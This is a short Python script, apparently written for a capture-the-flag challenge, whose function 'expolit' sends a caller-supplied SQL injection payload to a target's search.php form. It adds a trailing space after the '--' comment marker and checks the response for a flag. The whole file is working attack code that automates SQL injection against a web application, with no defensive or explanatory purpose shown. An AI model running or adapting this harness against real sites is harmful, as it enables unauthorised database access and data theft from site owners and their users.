import re
import requests

from urllib.parse import urljoin
from logger import logger

def sanitize_payload(url, payload):
    if not "root" in payload:
        logger.warning(f"No `root` found in payload. ")
        return None
    if payload.endswith("--"):
        logger.info("payload not end with space, add space")
        payload += " "
    return payload

def expolit(url, payload):
    payload = sanitize_payload(url, payload)
    if payload is None:
        return None
    url = urljoin(url, "search.php")
    logger.info(f"in function sql_inject, {url = }")
    logger.info(f"in function sql_inject, {payload = }")
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,ko;q=0.8",
        "Connection": "keep-alive"
    }
    data = {
        "title": payload,
        "author": ""
    }
    response = requests.post(url, data=data, headers=headers)
    logger.info(f"{response = }")
    logger.info(f"in function sql_inject, {response.text = }")
    logger.error(f"in function sql_inject, flag in response.txt: {'flag' in response.text}")
    if response.status_code == 200:
        return response.text
    else:
        return None
